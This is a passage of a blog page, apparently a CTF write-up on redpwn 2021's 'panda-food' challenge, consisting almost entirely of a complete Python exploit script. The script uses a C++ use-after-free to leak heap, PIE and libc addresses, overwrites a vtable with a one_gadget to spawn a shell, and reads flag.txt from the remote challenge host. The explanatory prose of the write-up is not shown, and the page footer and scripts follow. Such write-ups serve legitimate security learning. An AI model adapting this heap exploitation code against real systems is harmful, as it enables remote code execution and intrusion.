+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span><span class=lnt>76
+</span><span class=lnt>77
+</span><span class=lnt>78
+</span><span class=lnt>79
+</span><span class=lnt>80
+</span><span class=lnt>81
+</span><span class=lnt>82
+</span><span class=lnt>83
+</span><span class=lnt>84
+</span><span class=lnt>85
+</span><span class=lnt>86
+</span><span class=lnt>87
+</span><span class=lnt>88
+</span><span class=lnt>89
+</span><span class=lnt>90
+</span><span class=lnt>91
+</span><span class=lnt>92
+</span><span class=lnt>93
+</span><span class=lnt>94
+</span><span class=lnt>95
+</span><span class=lnt>96
+</span><span class=lnt>97
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwnscripts</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>string</span> <span class=kn>import</span> <span class=n>whitespace</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>random</span> <span class=kn>import</span> <span class=n>randint</span>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=s1>&#39;chall&#39;</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>LOCAL</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>context</span><span class=o>.</span><span class=n>libc</span> <span class=o>=</span> <span class=s1>&#39;libc6_2.27-3ubuntu1.4_amd64&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=n>context</span><span class=o>.</span><span class=n>binary</span><span class=o>.</span><span class=n>process</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span> <span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;mc.ax&#39;</span><span class=p>,</span> <span class=mi>31707</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>optc</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>flush</span><span class=p>():</span> <span class=c1># speed up i/o by deferring recvs until necessary</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>optc</span>
+</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>optc</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;choice: </span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>optc</span> <span class=o>-=</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>choose</span><span class=p>(</span><span class=n>opt</span><span class=p>:</span> <span class=nb>int</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>optc</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>opt</span><span class=p>))</span> <span class=c1># io speed: r.sendlineafter(&#39;choice: \n&#39;, str(opt))</span>
+</span></span><span class=line><span class=cl>    <span class=n>optc</span><span class=o>+=</span><span class=mi>1</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>sendidx</span><span class=p>(</span><span class=n>idx</span><span class=p>:</span> <span class=nb>int</span><span class=p>):</span> <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span> <span class=c1># io speed: r.sendlineafter(&#39;idx: \n&#39;, str(idx))</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>alloc</span><span class=p>(</span><span class=n>idx</span><span class=p>:</span> <span class=nb>int</span><span class=p>,</span> <span class=n>name</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>assert</span> <span class=nb>all</span><span class=p>(</span><span class=n>c</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>whitespace</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span> <span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=n>name</span><span class=p>)</span> <span class=c1># whitespace will cause cin to terminate. This necessarily means that some ASLR bytes can kill an exploit.</span>
+</span></span><span class=line><span class=cl>    <span class=k>assert</span> <span class=nb>len</span><span class=p>(</span><span class=n>name</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mh>0x1000</span>
+</span></span><span class=line><span class=cl>    <span class=n>choose</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sendidx</span><span class=p>(</span><span class=n>idx</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>name</span><span class=p>)</span> <span class=c1># io speed: r.sendlineafter(&#39;name: \n&#39;, name)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>fav</span><span class=p>(</span><span class=n>idx</span><span class=p>:</span> <span class=nb>int</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>choose</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sendidx</span><span class=p>(</span><span class=n>idx</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>printName</span><span class=p>()</span> <span class=o>-&gt;</span> <span class=nb>bytes</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>choose</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>flush</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;name: &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>(</span><span class=n>timeout</span><span class=o>=</span><span class=mi>1</span><span class=p>)[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>Eat</span><span class=p>():</span> <span class=n>choose</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>checkWhich</span><span class=p>(</span><span class=n>idx</span><span class=p>:</span> <span class=nb>int</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>str</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;&#39;&#39;figure out if foods[idx] was a Bamboo or a Food.
+</span></span></span><span class=line><span class=cl><span class=s1>    Destroys the current `favorite`.&#39;&#39;&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=n>fav</span><span class=p>(</span><span class=n>idx</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>Eat</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>flush</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39;crunch&#39;</span> <span class=ow>in</span> <span class=n>res</span><span class=p>:</span> <span class=k>return</span> <span class=s1>&#39;bamboo&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39;nom nom&#39;</span> <span class=ow>in</span> <span class=n>res</span><span class=p>:</span> <span class=k>return</span> <span class=s1>&#39;food&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=k>raise</span> <span class=ne>RuntimeError</span><span class=p>(</span><span class=s1>&#39;wrong food&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># step 1: leak heap using a UAF</span>
+</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x97</span><span class=p>)</span> <span class=c1># larger allocation to allow for larger leak</span>
+</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x7</span><span class=p>)</span>  <span class=c1># needed for PIE leak later</span>
+</span></span><span class=line><span class=cl><span class=n>fav</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=mh>0x27</span><span class=p>)</span> <span class=c1># Freeing foods[0] causes favorite-&gt;name_ to point to the tcache @ heap+0x10 (since favorite-&gt;name_ == [favorite+0x8] == (malloc_chunk*)favorite-&gt;bk)</span>
+</span></span><span class=line><span class=cl><span class=n>heapbase</span> <span class=o>=</span> <span class=n>unpack</span><span class=p>(</span><span class=n>printName</span><span class=p>()[</span><span class=mi>72</span><span class=p>:</span><span class=mi>80</span><span class=p>])</span><span class=o>&amp;</span><span class=mh>0xfffffffff000</span> <span class=c1># tcache[72:80] == tcache[size=0x30]. &amp; to get base.</span>
+</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s1>&#39;heap: &#39;</span><span class=o>+</span><span class=nb>hex</span><span class=p>(</span><span class=n>heapbase</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;on a brand new allocation,
+</span></span></span><span class=line><span class=cl><span class=s1>    - malloc 40 (Food/Bamboo)
+</span></span></span><span class=line><span class=cl><span class=s1>    - if foods[idx] doesn&#39;t exist, malloc 48 (map element)
+</span></span></span><span class=line><span class=cl><span class=s1>    - if name.size() &gt; 0xf, malloc space for string (31, 61, 121, ...).
+</span></span></span><span class=line><span class=cl><span class=s1>    - if food type is Bamboo, allocate name.size() space for a copy of the string.
+</span></span></span><span class=line><span class=cl><span class=s1>    - if foods[idx] exists, free the backing store for foods[idx]-&gt;name_ (if foods[idx]-&gt;name_.size() was &gt; 0xf), and then free foods[idx] itself.&#39;&#39;&#39;</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>fakeFood</span><span class=p>(</span><span class=n>payload</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>int</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;&#39;&#39;creates a fake Food struct containing `payload` at a random `idx`, stored as favorite. returns idx&#39;&#39;&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=n>idx</span> <span class=o>=</span> <span class=n>randint</span><span class=p>(</span><span class=mi>100</span><span class=p>,</span><span class=mi>1</span><span class=o>&lt;&lt;</span><span class=mi>30</span><span class=p>)</span> <span class=c1># negligible chance of overlap</span>
+</span></span><span class=line><span class=cl>    <span class=n>alloc</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;b&#39;</span><span class=o>*</span><span class=mi>60</span><span class=p>)</span> <span class=c1># alloc 40, 48, 61, and potentially alloc&amp;&amp;free 61.</span>
+</span></span><span class=line><span class=cl>    <span class=n>fav</span><span class=p>(</span><span class=n>idx</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>alloc</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;b&#39;</span><span class=o>*</span><span class=mi>60</span><span class=p>)</span> <span class=c1># alloc 40&amp;61, free previous 61&amp;40.</span>
+</span></span><span class=line><span class=cl>    <span class=c1># the Food struct for `favorite` is at the top of tcache[size=0x30] at this point.</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>10</span><span class=p>):</span> <span class=c1># There&#39;s a 1/2 that `favorite` is overwritten with the payload for every loop here. (1/2)**10 is a small enough error rate.</span>
+</span></span><span class=line><span class=cl>        <span class=c1># The other 1/2 chance puts `favorite` back on the top of tcache, so just repeat to increase odds.</span>
+</span></span><span class=line><span class=cl>        <span class=n>alloc</span><span class=p>(</span><span class=n>idx</span><span class=o>+</span><span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=p>,</span> <span class=n>payload</span><span class=p>[:</span><span class=mh>0x17</span><span class=p>]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x17</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\0</span><span class=s1>&#39;</span><span class=p>))</span> <span class=c1># Note that len(payload) must not be within [0x18, 0x28) to prevent an additional 0x30 chunk allocation.</span>
+</span></span><span class=line><span class=cl>        <span class=c1># len(payload) &gt; 0x1f is also forbidden because it would cause the malloc(31) string buffer to be freed. This resolves to len(payload) &lt; 0x17.</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>idx</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>leak</span><span class=p>(</span><span class=n>addr</span><span class=p>:</span> <span class=nb>int</span><span class=p>,</span> <span class=n>sz</span><span class=p>:</span> <span class=nb>int</span><span class=o>=</span><span class=mi>8</span><span class=p>):</span> <span class=c1># leak the first `sz` bytes from `addr`</span>
+</span></span><span class=line><span class=cl>    <span class=n>fakeFood</span><span class=p>(</span><span class=n>fit</span><span class=p>({</span><span class=mi>8</span><span class=p>:</span><span class=n>addr</span><span class=p>,</span><span class=mh>0x10</span><span class=p>:</span><span class=n>sz</span><span class=o>+</span><span class=mi>8</span><span class=p>}))</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>unpack</span><span class=p>(</span><span class=n>printName</span><span class=p>()[:</span><span class=n>sz</span><span class=p>],</span><span class=s1>&#39;all&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># step 2: heap leak -&gt; PIE leak -&gt; libc leak</span>
+</span></span><span class=line><span class=cl><span class=n>foods1_offset</span> <span class=o>=</span> <span class=nb>next</span><span class=p>(</span><span class=n>i</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>99999</span><span class=p>,</span><span class=mh>0x1000</span><span class=p>)</span> <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\0</span><span class=s1>aaaaaaa</span><span class=se>\0</span><span class=s1>&#39;</span> <span class=ow>in</span> <span class=p>(</span><span class=n>dat</span> <span class=o>:=</span> <span class=n>pack</span><span class=p>(</span><span class=n>leak</span><span class=p>(</span><span class=n>heapbase</span><span class=o>+</span><span class=n>i</span><span class=p>,</span><span class=mh>0x1000</span><span class=p>),</span><span class=s1>&#39;all&#39;</span><span class=p>)))</span> <span class=c1># note that this is actually a constant, but I prefer finding the offset dynamically</span>
+</span></span><span class=line><span class=cl><span class=n>pie_leak</span> <span class=o>=</span> <span class=n>leak</span><span class=p>(</span><span class=n>heapbase</span><span class=o>+</span><span class=n>foods1_offset</span><span class=o>+</span><span class=n>dat</span><span class=o>.</span><span class=n>index</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\0</span><span class=s1>aaaaaaa</span><span class=se>\0</span><span class=s1>&#39;</span><span class=p>)</span><span class=o>-</span><span class=mi>23</span><span class=p>)</span> <span class=c1># this is a leak of foods[1].vtable.</span>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>pie_leak</span> <span class=o>-</span> <span class=p>(</span><span class=mh>0x2e7d78</span> <span class=k>if</span> <span class=n>checkWhich</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=o>==</span> <span class=s1>&#39;bamboo&#39;</span> <span class=k>else</span> <span class=mh>0x2e7d50</span><span class=p>)</span> <span class=c1># offset to the .relro vtable of Bamboo/Food. Find value from IDA or gdb</span>
+</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s1>&#39;PIE: &#39;</span><span class=o>+</span><span class=nb>hex</span><span class=p>(</span><span class=n>context</span><span class=o>.</span><span class=n>binary</span><span class=o>.</span><span class=n>address</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=k>assert</span> <span class=n>is_addr</span><span class=o>.</span><span class=n>base</span><span class=p>(</span><span class=n>context</span><span class=o>.</span><span class=n>binary</span><span class=o>.</span><span class=n>address</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>libc</span> <span class=o>=</span> <span class=n>context</span><span class=o>.</span><span class=n>libc_database</span><span class=o>.</span><span class=n>libc_find</span><span class=p>({</span><span class=n>f</span><span class=p>:</span><span class=n>leak</span><span class=p>(</span><span class=n>context</span><span class=o>.</span><span class=n>binary</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=n>f</span><span class=p>])</span> <span class=k>for</span> <span class=n>f</span> <span class=ow>in</span> <span class=p>[</span><span class=s1>&#39;malloc&#39;</span><span class=p>,</span> <span class=s1>&#39;free&#39;</span><span class=p>]})</span> <span class=c1># libc6_2.27-3ubuntu1.4_amd64</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># step 3: overwrite vtable to &amp;one_gadget</span>
+</span></span><span class=line><span class=cl><span class=n>og</span> <span class=o>=</span> <span class=n>context</span><span class=o>.</span><span class=n>libc</span><span class=o>.</span><span class=n>select_gadget</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=c1># empirical testing for working one_gadget</span>
+</span></span><span class=line><span class=cl><span class=c1>#og = context.binary.address+0x15bc0 # &lt;--- proof of RIP control; this will cause &#34;om nom nom&#34; to appear 100% of the time</span>
+</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=n>pack</span><span class=p>(</span><span class=n>og</span><span class=p>)</span><span class=o>*</span><span class=mh>0x1ff</span><span class=p>)</span> <span class=c1># flood the heap with the one_gadget to make finding heap offset easier</span>
+</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s1>&#39;one_gadget: &#39;</span><span class=o>+</span><span class=nb>hex</span><span class=p>(</span><span class=n>og</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=c1>#print(pack(leak(og, 200),&#39;all&#39;)) # &lt;--- evidence that *one_gadget is real</span>
+</span></span><span class=line><span class=cl><span class=n>fakeFood</span><span class=p>(</span><span class=n>pack</span><span class=p>(</span><span class=n>heapbase</span><span class=o>+</span><span class=nb>next</span><span class=p>(</span><span class=n>i</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x5000</span><span class=p>,</span><span class=mh>0x800</span><span class=p>)</span> <span class=k>if</span> <span class=n>leak</span><span class=p>(</span><span class=n>heapbase</span><span class=o>+</span><span class=n>i</span><span class=p>)</span> <span class=o>==</span> <span class=n>og</span><span class=p>)))</span>
+</span></span><span class=line><span class=cl><span class=n>flush</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>Eat</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;choice: </span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=s1>&#39;cat flag.txt</span><span class=se>\n</span><span class=s1>exit&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>recvall</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
+</span></span></code></pre></td></tr></table></div></div></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on August 20, 2022&nbsp;<a class=git-hash href=https://github.com/152334H/blog/commit/9043fe81da576b575f9034af7e5c6056f051ba22 target=_blank title="commit by 152334H(54623771+152334H@users.noreply.github.com) 9043fe81da576b575f9034af7e5c6056f051ba22: Content push">
+<i class="fas fa-hashtag fa-fw" aria-hidden=true></i>9043fe8</a></span></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span><a href=javascript:void(0); title="Share on Twitter" data-sharer=twitter data-url=https://152334H.github.io/blog/redpwn-2021-panda-food/ data-title="C++ Smart Pointer UAFs: redpwn 2021's panda-food" data-hashtags=writeup,pwn><i class="fab fa-twitter fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Facebook" data-sharer=facebook data-url=https://152334H.github.io/blog/redpwn-2021-panda-food/ data-hashtag=writeup><i class="fab fa-facebook-square fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Linkedin" data-sharer=linkedin data-url=https://152334H.github.io/blog/redpwn-2021-panda-food/><i class="fab fa-linkedin fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Hacker News" data-sharer=hackernews data-url=https://152334H.github.io/blog/redpwn-2021-panda-food/ data-title="C++ Smart Pointer UAFs: redpwn 2021's panda-food"><i class="fab fa-hacker-news fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Reddit" data-sharer=reddit data-url=https://152334H.github.io/blog/redpwn-2021-panda-food/><i class="fab fa-reddit fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Line" data-sharer=line data-url=https://152334H.github.io/blog/redpwn-2021-panda-food/ data-title="C++ Smart Pointer UAFs: redpwn 2021's panda-food"><i data-svg-src=https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg aria-hidden=true></i></a><a href=javascript:void(0); title="Share on 微博" data-sharer=weibo data-url=https://152334H.github.io/blog/redpwn-2021-panda-food/ data-title="C++ Smart Pointer UAFs: redpwn 2021's panda-food"><i class="fab fa-weibo fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw" aria-hidden=true></i>&nbsp;<a href=/tags/writeup/>writeup</a>,&nbsp;<a href=/tags/pwn/>pwn</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span></section></div><div class=post-nav><a href=/blog/icsha-2021-cop/ class=prev rel=prev title="ICHSA 2021: COP"><i class="fas fa-angle-left fa-fw" aria-hidden=true></i>ICHSA 2021: COP</a>
+<a href=/blog/rarctf-2021-the-mound/ class=next rel=next title="Getting things wrong: How I spent 24-hours on a beginner's CTF pwn">Getting things wrong: How I spent 24-hours on a beginner's CTF pwn<i class="fas fa-angle-right fa-fw" aria-hidden=true></i></a></div></div><div id=comments><div id=giscus class=comment></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://giscus.app>Giscus</a>.</noscript></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2022</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=https://152334H.github.io/ target=_blank>152334H</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
+</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.css><script type=text/javascript src=https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/twemoji@14.0.2/dist/twemoji.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/auto-render.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/copy-tex.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/mhchem.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:10},comment:{giscus:{category:"Announcements",categoryId:"DIC_kwDOH03r284CQ2Tu",darkTheme:"dark_dimmed",emitMetadata:"0",inputPosition:"bottom",lang:"en",lazyLoading:!1,lightTheme:"light",mapping:"pathname",reactionsEnabled:"1",repo:"152334H/blog",repoId:"R_kgDOH03r2w"}},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!0,left:"\\begin{equation}",right:"\\end{equation}"},{display:!0,left:"\\begin{equation*}",right:"\\end{equation*}"},{display:!0,left:"\\begin{align}",right:"\\end{align}"},{display:!0,left:"\\begin{align*}",right:"\\end{align*}"},{display:!0,left:"\\begin{alignat}",right:"\\end{alignat}"},{display:!0,left:"\\begin{alignat*}",right:"\\end{alignat*}"},{display:!0,left:"\\begin{gather}",right:"\\end{gather}"},{display:!0,left:"\\begin{CD}",right:"\\end{CD}"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1},search:{highlightTag:"em",lunrIndexURL:"/index.json",maxResultLength:10,noResultsFound:"No results found",snippetLength:30,type:"lunr"},twemoji:!0}</script><script type=text/javascript src=/js/theme.min.js></script><script type=text/javascript>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-W0STJ4D3N3",{anonymize_ip:!0})</script><script type=text/javascript src="https://www.googletagmanager.com/gtag/js?id=G-W0STJ4D3N3" async></script></body></html>
